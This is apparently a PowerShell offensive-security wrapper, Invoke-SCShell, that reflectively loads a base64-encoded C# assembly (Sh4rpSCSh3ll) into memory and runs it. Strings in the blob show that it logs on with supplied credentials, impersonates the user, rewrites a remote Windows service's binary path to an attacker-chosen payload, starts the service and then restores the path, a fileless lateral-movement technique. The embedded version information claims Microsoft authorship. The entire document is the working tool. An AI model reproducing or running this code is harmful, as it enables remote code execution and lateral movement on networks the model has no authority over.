function Invoke-SCShell
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )

    $base64binary="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CQDPAgEARgELAGUFAQAAAQ0AUQUBAEABDwDbAgIAAAERALkGAwAAARMAjAIDAASAAAABAAAAAAAAAAAAAAAAALoFAAACAAAAAAAAAAAAAABnAIMCAAAAAAMAAgAEAAIABQACAAYAAgAAAAAAAGFkdmFwaTMyAFVJbnQzMgA8TW9kdWxlPgBDaGFuZ2VTZXJ2aWNlQ29uZmlnQQBHRU5FUklDX1JFQUQAU1RBTkRBUkRfUklHSFRTX1JFQUQAU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEAHRhZ0lEAFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UAU0NfTUFOQUdFUl9FTlVNRVJBVEVfU0VSVklDRQBTRVJWSUNFX0lOVEVSUk9HQVRFAEdFTkVSSUNfV1JJVEUAU1RBTkRBUkRfUklHSFRTX1dSSVRFAEdFTkVSSUNfRVhFQ1VURQBTVEFOREFSRF9SSUdIVFNfRVhFQ1VURQBTRVJWSUNFX1BBVVNFX0NPTlRJTlVFAFNFUlZJQ0VfQ0hBTkdFX0NPTkZJRwBTQ19NQU5BR0VSX01PRElGWV9CT09UX0NPTkZJRwBTRVJWSUNFX1FVRVJZX0NPTkZJRwBTQ19NQU5BR0VSX0xPQ0sAQUNDRVNTX01BU0sAR0VORVJJQ19BTEwAU0VSVklDRV9VU0VSX0RFRklORURfQ09OVFJPTABTRVJWSUNFX1NUT1AAU0VSVklDRV9BQ0NFU1MAU0VSVklDRV9BTExfQUNDRVNTAFNDX01BTkFHRVJfQUxMX0FDQ0VTUwBTQ01fQUNDRVNTAFNFUlZJQ0VfRU5VTUVSQVRFX0RFUEVOREVOVFMAU0NfTUFOQUdFUl9RVUVSWV9MT0NLX1NUQVRVUwBTRVJWSUNFX1FVRVJZX1NUQVRVUwBTQ19NQU5BR0VSX0NPTk5FQ1QAU0VSVklDRV9TVEFSVABPcGVuU0NNYW5hZ2VyVwB2YWx1ZV9fAG1zY29ybGliAEdsb2JhbEFsbG9jAGxwZHdUYWdJZABieXRlc05lZWRlZABscFBhc3N3b3JkAGxwc3pQYXNzd29yZABoU2VydmljZQBPcGVuU2VydmljZQBTdGFydFNlcnZpY2UAc2VydmljZQBDb25zb2xlAGxwU2VydmljZU5hbWUAbHBNYWNoaW5lTmFtZQBscERhdGFiYXNlTmFtZQBscEJpbmFyeVBhdGhOYW1lAGJpbmFyeVBhdGhOYW1lAGxwU2VydmljZVN0YXJ0TmFtZQBzdGFydE5hbWUAbHBEaXNwbGF5TmFtZQBkaXNwbGF5TmFtZQBscHN6VXNlcm5hbWUAV3JpdGVMaW5lAGR3U2VydmljZVR5cGUAc2VydmljZVR5cGUAVmFsdWVUeXBlAGR3TG9nb25UeXBlAEdldFR5cGUAZHdTdGFydFR5cGUAc3RhcnRUeXBlAFB0clRvU3RydWN0dXJlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAc2NzaGVsbC5leGUAYnVmZmVyU2l6ZQBDaGFuZ2VTZXJ2aWNlQ29uZmlnAFF1ZXJ5U2VydmljZUNvbmZpZwBxdWVyeVNlcnZpY2VDb25maWcATWFyc2hhbABTaDRycFNDU2gzbGwAYWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbABzY3NoZWxsAGR3RXJyb3JDb250cm9sAGVycm9yQ29udHJvbABQcm9ncmFtAEFsbG9jQ29UYXNrTWVtAEZyZWVDb1Rhc2tNZW0AU3lzdGVtAEVudW0AcGhUb2tlbgBNYWluAGxwc3pEb21haW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBQdHJUb1N0cmluZ0F1dG8AbHBMb2FkT3JkZXJHcm91cABsb2FkT3JkZXJHcm91cABkd0xvZ29uUHJvdmlkZXIAaFNDTWFuYWdlcgBPcGVuU0NNYW5hZ2VyAEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyAExvZ29uVXNlcgBHZXRMYXN0RXJyb3IALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBscERlcGVuZGVuY2llcwBkZXBlbmRlbmNpZXMAZHdCeXRlcwB1RmxhZ3MAZHdOdW1TZXJ2aWNlQXJncwBhcmdzAGxwU2VydmljZUFyZ1ZlY3RvcnMAZHdEZXNpcmVkQWNjZXNzAE9iamVjdABRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QAb3BfRXF1YWxpdHkAAAAAAICfPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIABTAGgANAByAHAAUwBDAFMAaAAzAGwAbAAgAC0ALQA+ACAAUgBlAHYAaQBzAGUAZAAgAGEAdAAgAFIAYwBvAGkAbAAgACgAQwAjACAAdgBlAHIAcwBpAG8AbgApACAAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIAABgIFTAGgANAByAHAAUwBDAFMAaAAzAGwAbAAuAGUAeABlACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGkAYwBlACAAcABhAHkAbABvAGEAZAAgAGQAbwBtAGEAaQBuACAAdQBzAGUAcgBuAGEAbQBlACAAcABhAHMAcwB3AG8AcgBkAAA5WwAqAF0AIABUAHIAeQBpAG4AZwAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB7ADAAfQAAbVsAKgBdACAAVQBzAGUAcgBuAGEAbQBlACAAdwBhAHMAIABwAHIAbwB2AGkAZABlAGQAIABhAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAYwBhAGwAbAAgAEwAbwBnAG8AbgBVAHMAZQByAAA/WwAhAF0AIABMAG8AZwBvAG4AVQBzAGUAcgAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAOgB7ADAAfQAAW1sAIQBdACAASQBtAHAAZQByAHMAbwBuAGEAdABlAEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByACAAZgBhAGkAbABlAGQALgAgAEUAcgByAG8AcgA6AHsAMAB9AABJWwAhAF0AIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByAEEAIABmAGEAaQBsAGUAZAAhACAARQByAHIAbwByADoAewAwAH0AADdbACoAXQAgAFMAQwBfAEgAQQBOAEQATABFACAATQBhAG4AYQBnAGUAcgAgADAAeAB7ADAAfQAAOVsAKgBdACAATwBwAGUAbgBpAG4AZwAgAHsAMAB9ACAAUwBlAHIAdgBpAGMAZQAgAC4ALgAuAC4AADdbACoAXQAgAFMAQwBfAEgAQQBOAEQATABFACAAUwBlAHIAdgBpAGMAZQAgADAAeAB7ADAAfQAAgINbACEAXQAgAFEAdQBlAHIAeQBTAGUAcgB2AGkAYwBlAEMAbwBuAGYAaQBnACAAZgBhAGkAbABlAGQAIAB0AG8AIAByAGUAYQBkACAAdABoAGUAIABzAGUAcgB2AGkAYwBlACAAcABhAHQAaAAuACAARQByAHIAbwByADoAewAwAH0AAFVbACoAXQAgAEwAUABRAFUARQBSAFkAXwBTAEUAUgBWAEkAQwBFAF8AQwBPAE4ARgBJAEcAQQAgAG4AZQBlAGQAIAB7ADAAfQAgAGIAeQB0AGUAcwAATVsAKgBdACAATwByAGkAZwBpAG4AYQBsACAAcwBlAHIAdgBpAGMAZQAgAGIAaQBuAGEAcgB5ACAAcABhAHQAaAAgACIAewAwAH0AIgAAgItbACEAXQAgAEMAaABhAG4AZwBlAFMAZQByAHYAaQBjAGUAQwBvAG4AZgBpAGcAQQAgAGYAYQBpAGwAZQBkACAAdABvACAAdQBwAGQAYQB0AGUAIAB0AGgAZQAgAHMAZQByAHYAaQBjAGUAIABwAGEAdABoAC4AIABFAHIAcgBvAHIAOgB7ADAAfQAAS1sAKgBdACAAUwBlAHIAdgBpAGMAZQAgAHAAYQB0AGgAIAB3AGEAcwAgAGMAaABhAG4AZwBlAGQAIAB0AG8AIAAiAHsAMAB9ACIAAHFbACEAXQAgAFMAdABhAHIAdABTAGUAcgB2AGkAYwBlAEEAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAgAHQAaABlACAAcwBlAHIAdgBpAGMAZQAuACAARQByAHIAbwByADoAewAwAH0AAC9bACoAXQAgAFMA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"
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Sh4rpSCSh3ll.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}